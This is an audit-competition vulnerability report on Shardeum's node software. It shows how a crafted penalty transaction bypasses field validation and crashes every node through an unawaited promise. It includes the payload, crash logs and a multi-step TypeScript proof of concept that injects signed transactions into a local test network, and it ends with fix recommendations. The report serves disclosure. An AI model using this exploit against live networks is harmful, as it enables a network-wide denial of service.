# #35696 \[BC-Critical] Specifically crafted penalty TX may cause total network shutdown.

**Submitted on Oct 3rd 2024 at 18:57:23 UTC by @Merkle\_Bonsai for** [**Audit Comp | Shardeum: Core II**](https://immunefi.com/audit-competition/shardeum-core-ii-boost)

* **Report ID:** #35696
* **Report Type:** Blockchain/DLT
* **Report severity:** Critical
* **Target:** <https://github.com/shardeum/shardeum/tree/dev>
* **Impacts:**
  * Network not being able to confirm new transactions (total network shutdown)

## Description

## Brief/Intro

Due to incorrect logic of processing penalty transactions, assertions in "validateTxnFields" may be bypassed, allowing to deliver malicious payload causing node thread crash or penaltization.

Please note that \`isDebugTx+isInternalTx\` is separate vector for multiple vulnerabilities (report 35695), and I'm only using it here as a way of easy deployment of bad transaction.

## Vulnerability Details

If transaction like this is injected (where keypair and walletWithProvider are existing shardeus entities), it will bypass \`validateTxnFields\` check and will cause non-catched exception in \`src/tx/penalty/transaction.tx:153\`. \`\`\` { publicKey: keypair.publicKey, isDebugTx: true, isInternalTx: true, internalTXType: InternalTXType.Penalty, reportedNodePublickKey: keypair.publicKey, operatorEVMAddress: walletWithProvider.address, timestamp: -1, validatePenaltyTX: 1999 } \`\`\`

This is what happens in logs of every node: \`\`\` 2|"shardus-instance-9001" | Error: Unknown Violation type: , undefined 2|"shardus-instance-9001" | at isProcessedPenaltyTx (shardeum/src/tx/penalty/transaction.ts:153:13) 2|"shardus-instance-9001" | at applyPenaltyTX (shardeum/src/tx/penalty/transaction.ts:318:38) 2|"shardus-instance-9001" | at applyInternalTx (shardeum/src/index.ts:2989:19) 2|"shardus-instance-9001" | at Object.apply (shardeum/src/index.ts:4070:16) 2|"shardus-instance-9001" | at Object.applicationInterfaceImpl.apply (shardeum/node\_modules/@shardus/src/shardus/index.ts:2485:23) 2|"shardus-instance-9001" | at TransactionQueue.preApplyTransaction (shardeum/node\_modules/@shardus/src/state-manager/TransactionQueue.ts:1356:40) 2|"shardus-instance-9001" | at TransactionQueue.processTransactions (shardeum/node\_modules/@shardus/src/state-manager/TransactionQueue.ts:6492:32) 2|"shardus-instance-9001" | Encountered a fatal error. Check fatal log for details. 2|"shardus-instance-9001" | Shutting down... \`\`\`

Crash happens in \`isProcessedPenaltyTx\` and is caused by \`applyPenaltyTX\` being not awaited (thus, not catching errors across asynchronyous stack) on \`src/index.ts:2989\` in case of cascade crash scenario. \`validatePenaltyTX\` only checks that \`violationType\` lies between \`ShardeumMinID\` (1000) and \`ShardeumMaxID\` (2000), yet for unknown violation types no extra checks are done.

This is happening due to this shardus logic part: \`\`\` process.on('uncaughtException', (err) => { logFatalAndExit(err) }) \`\`\`

BTW, you also have typo in "reportedNodePublickKey" name.

## Recommendations

Along with this specific fix, I generally recommend to use this typescript-eslint rule <https://typescript-eslint.io/rules/no-floating-promises> to enforce promise handling, reducing the possibility of such cases.

Same issue is also at least theoretically possible in ClaimReward handling (no await on \`applyClaimRewardTx\`), yet I do not see possible practical possibilities of causing crash in it.

## Proof of Concept

## Proof of Concept

Please note that this PoC demonstrates multiple attacks at same time - sadly, any other code example will be larger and more verbose. This PoC is partially shared with my other report ("validateTxnFields check for internal transactions can be bypassed"), however, it is simplest way to demonstrate the attack vector described above.

Since this requires some manually observed delay, attack is done in several steps, with switching the step iterationally (stake-init-penalty).

I'm using 10-node configuration, production mode, with only account \`0xCf551a61548863765bf635feaAa2501636B91908\` added to genesis and change in \`getExternalApiMiddleware\`, that allows to use node 9005 without auth: \`\`\` export const getExternalApiMiddleware = () => { return (req, res, next): unknown => { const { path, method } = req

```
let isAllowed &#x3D; true // Default to true
const isBadNode &#x3D; p2pSelf.getThisNodeInfo().externalPort &#x3D;&#x3D;&#x3D; 9005
if (isBadNode) {
  next()
  return
}
...
```

\`\`\`

\`\`\` const keypair = JSON.parse(await fs.readFile('../instances/shardus-instance-9005/secrets.json'))

const provider = new ethers.JsonRpcProvider('<http://localhost:8080>', 8082, { batchMaxCount: 1 }) const walletWithProvider = new ethers.Wallet( '0x82beccb10f7c4552334dbf1d778a88d7749656fc329ca4ea4c66f714ed7760fb', provider ) // address 0xCf551a61548863765bf635feaAa2501636B91908 console.log('address', walletWithProvider.address) const stakeRequired = BigInt('0x8ac7230489e80000')

enum Step { stake, init, unstake, penalty, }

const step = Step.penalty

switch (step) { case Step.stake: { const raw = await walletWithProvider.signTransaction({ to: '0x0000000000000000000000000000000000010000', gasPrice: '30000', gasLimit: 30000000, value: stakeRequired, chainId: 8082, data: ethers.hexlify( ethers.toUtf8Bytes( JSON.stringify({ isInternalTx: true, internalTXType: InternalTXType.Stake, nominator: walletWithProvider.address.toLowerCase(), timestamp: Date.now(), nominee: keypair.publicKey, stake: { dataType: 'bi', value: stakeRequired.toString(16) }, }) ) ), nonce: await walletWithProvider.getNonce(), }) await post('<http://127.0.0.1:9005/inject>', { raw, timestamp: Date.now(), appDataOverride: { networkAccount: networkAccount, }, }) break } case Step.init: { await post( '<http://127.0.0.1:9005/inject>', crypto.signObj( { publicKey: keypair.publicKey, isDebugTx: true, isInternalTx: true, internalTXType: InternalTXType.InitRewardTimes, nominee: keypair.publicKey, nodeActivatedTime: 1, timestamp: Date.now() - 5 \* 60000, }, keypair.secretKey, keypair.publicKey ) ) break } case Step.penalty: { await post( '<http://127.0.0.1:9005/inject>', crypto.signObj( { publicKey: keypair.publicKey, isDebugTx: true, isInternalTx: true, internalTXType: InternalTXType.Penalty, reportedNodePublickKey: keypair.publicKey, operatorEVMAddress: walletWithProvider.address, timestamp: -1, // validatePenaltyTX: 1999 - this can be skipped with isDebugTx }, keypair.secretKey, keypair.publicKey ) ) break; } } \`\`\`
